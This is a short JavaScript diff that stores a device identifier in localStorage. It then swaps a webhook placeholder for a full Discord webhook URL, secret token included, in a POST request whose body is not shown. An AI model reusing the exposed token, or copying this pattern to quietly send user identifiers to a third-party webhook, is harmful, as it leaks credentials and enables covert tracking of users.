@@ -12,7 +12,7 @@ if (!deviceId) {
   localStorage.setItem("deviceId", deviceId);
 }
 
-fetch("DISCORD_WEBHOOK_URL", {
+fetch("https://discord.com/api/webhooks/1443704225812058215/pfS9DPM1VtV5LGqyRKrnclWiIPlxu0UAYi0ATj5X4AMUN4mELMnCa2whfPfB9aNqQD3G", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
